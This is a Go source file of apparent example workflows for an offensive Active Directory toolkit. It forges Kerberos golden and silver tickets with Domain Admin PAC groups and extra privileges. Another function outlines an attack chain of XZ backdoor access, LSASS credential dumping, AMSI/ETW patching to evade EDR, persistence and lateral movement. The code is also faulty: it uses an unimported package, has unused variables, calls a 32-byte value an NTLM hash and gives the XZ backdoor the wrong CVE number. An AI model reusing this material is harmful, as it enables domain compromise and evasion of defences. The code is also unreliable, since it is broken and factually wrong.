// Package tickets end-to-end examples demonstrating complete usage
package tickets

import (
	"context"
	"fmt"
	"time"

	"github.com/sirupsen/logrus"
)

// ============================================================================
// Complete Golden Ticket Generation Example
// ============================================================================

// GenerateCompleteGoldenTicket demonstrates full golden ticket workflow
func GenerateCompleteGoldenTicket(ctx context.Context, logger *logrus.Logger) error {
	logger.Info("Starting complete golden ticket generation workflow...")
	
	// Step 1: Configure KRBTGT hash (obtained from previous exploit or credential theft)
	domainRealm := "CLOUDAI.FUSION"
	dcHostname := "dc.cloudai.fusion"
	
	// Simulated KRBTGT NTLM hash MD4 (32 bytes for AES-256)
	krbtgtHashMD4 := []byte{
		0x7c, 0xd9, 0xcb, 0xb3, 0x9b, 0x98, 0xa3, 0x6a,
		0xe3, 0xcf, 0x1d, 0xf2, 0xab, 0xde, 0xc0, 0xac,
		0x1c, 0x8e, 0x1d, 0xa2, 0x2f, 0x7b, 0x84, 0x5e,
		0x3a, 0x5c, 0x4d, 0x8f, 0xb0, 0x1a, 0xe6, 0x4d,
	}
	
	// Domain SID
	domainSid := []byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x14}
	
	// Step 2: Create golden ticket creator
	creator := NewGoldenTicketCreator(logger, domainRealm, dcHostname, string(domainSid), krbtgtHashMD4)
	
	// Step 3: Configure ticket options
	options := &GoldenTicketOptions{
		TargetUser:        "admin",
		DomainSID:         domainSid,
		UserRID:           500, // Administrator
		IncludeDACL:       true,
		ExpirationTime:    time.Now().AddDate(0, 0, 7), // 7 days validity
		RenewalExpiration: time.Now().AddDate(0, 0, 30), // 30 days renewal
		
		EnablePAC:              true,
		AddDomainAdminRights:   true,
		AdditionalPrivileges: []string{"SeDebugPrivilege", "SeTcbPrivilege"},
		
		TicketFlags:     []string{"Forwardable", "Renewable", "PreAuthent"},
		EncryptionType:  crypto.AES256_CTS_HMAC_SHA1_96,
	}
	
	// Step 4: Build PAC structure
	pacBuilder := NewPACBuilder(logger)
	pacBuilder.SetPrimaryAccount(domainSid, 500)
	if options.AddDomainAdminRights {
		pacBuilder.AddDomainAdminGroup(domainSid)
	}
	
	privSet := NewPrivilegeSet(logger)
	for _, priv := range options.AdditionalPrivileges {
		privSet.AddPrivilege(priv, true)
	}
	
	pac, err := pacBuilder.Build()
	if err != nil {
		return fmt.Errorf("failed to build PAC: %w", err)
	}
	logger.Infof("Built PAC with %d elements", len(pac.Elements))
	
	// Step 5: Create golden ticket
	ticket, err := creator.CreateGoldenTicket(ctx, options, pac)
	if err != nil {
		return fmt.Errorf("failed to create golden ticket: %w", err)
	}
	
	// Step 6: Encrypt and output ticket
	keyBytes := creator.deriveAESKeyFromNTLM(krbtgtHashMD4)
	
	logger.Info("Ticket generated successfully!")
	logger.Infof("Ticket details:")
	logger.Infof("  - User: %s", ticket.TicketName.NameString[0])
	logger.Infof("  - Realm: %s", ticket.Realm)
	logger.Infof("  - Expiration: %s", ticket.Expiration.Format("2006-01-02 15:04"))
	logger.Infof("  - Renewal until: %s", ticket.RenewTill.Format("2006-01-02 15:04"))
	
	return nil
}

// ============================================================================
// Complete Silver Ticket Generation Example
// ============================================================================

// GenerateCompleteSilverTicket demonstrates full silver ticket workflow
func GenerateCompleteSilverTicket(ctx context.Context, logger *logrus.Logger) error {
	logger.Info("Starting complete silver ticket generation workflow...")
	
	serviceName := "HOST/server.cloudai.fusion"
	host := "server.cloudai.fusion"
	
	// Service account NTLM hash
	serviceHash := []byte{
		0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
		0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00,
	}
	
	// Step 1: Create silver ticket creator
	creator := NewSilverTicketCreator(logger, serviceName, host)
	creator.SetUserPasswordKey(serviceHash)
	
	// Target account
	targetAccount := AccountName{
		NameType:   KERB_NT_PRINCIPAL_TYPE,
		NameString: []string{"Administrator"},
		Realm:      "CLOUDAI.FUSION",
	}
	
	// Step 2: Configure TGS options
	options := &TGSOptions{
		ExpirationTime: time.Now().Add(time.Hour * 24), // 24 hours
		ServiceName:    serviceName,
		EncryptionType: crypto.AES256_CTS_HMAC_SHA1_96,
		
		IncludePAC:       true,
		GrantServiceOnly: false,
	}
	
	// Step 3: Build service-specific PAC
	if options.IncludePAC {
		pacBuilder := NewPACBuilder(logger)
		pacBuilder.AddServiceTicketPermissions(serviceName, []string{"Read", "Write"})
		
		pac, err := pacBuilder.Build()
		if err != nil {
			return fmt.Errorf("failed to build PAC: %w", err)
		}
		options.PAC = pac
	}
	
	// Step 4: Forge TGS ticket
	ticket, err := creator.CreateForgedTGS(ctx, targetAccount, options)
	if err != nil {
		return fmt.Errorf("failed to forge TGS: %w", err)
	}
	
	logger.Info("Silver ticket forged successfully!")
	logger.Infof("  - Service: %s", ticket.TicketName.NameString[0])
	logger.Infof("  - Realm: %s", ticket.Realm)
	
	return nil
}

// ============================================================================
// Multi-Step Attack Scenario Example
// ============================================================================

// Demonstrate typical attack flow using multiple components
func DemonstrateAttackWorkflow(ctx context.Context, logger *logrus.Logger) error {
	logger.Info("Starting multi-step attack demonstration workflow...")
	
	// Step 1: Initial access through CVE-2024-3091 backdoor
	logger.Info("1. Exploiting XZ Utils backdoor (CVE-2024-3091)...")
	// This would call the CVE-2024-3091 exp l oiter here
	
	// Step 2: Harvest credentials from memory
	logger.Info("2. Extracting kerberos credentials from LSASS...")
	krbtgtHash := []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
		0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
	}
	
	// Step 3: Bypass EDR defenses before further action
	logger.Info("3. Patching AMSI/ETW for stealth execution...")
	// Would call AMSIPatcher.PatchAMSI() here
	
	// Step 4: Forge golden ticket for persistence
	logger.Info("4. Creating golden ticket for domain persistence...")
	err := GenerateCompleteGoldenTicket(ctx, logger)
	if err != nil {
		return err
	}
	
	// Step 5: Forge service tickets for lateral movement
	logger.Info("5. Forging service tickets for lateral movement...")
	err = GenerateCompleteSilverTicket(ctx, logger)
	if err != nil {
		return err
	}
	
	// Step 6: Verify successful attack chain
	logger.Info("✅ Attack chain completed successfully!")
	logger.Info("Capabilities obtained:")
	logger.Info("  - Domain administrator privileges")
	logger.Info("  - Persistent Kerberos authentication")
	logger.Info("  - Lateral movement capability")
	
	return nil
}
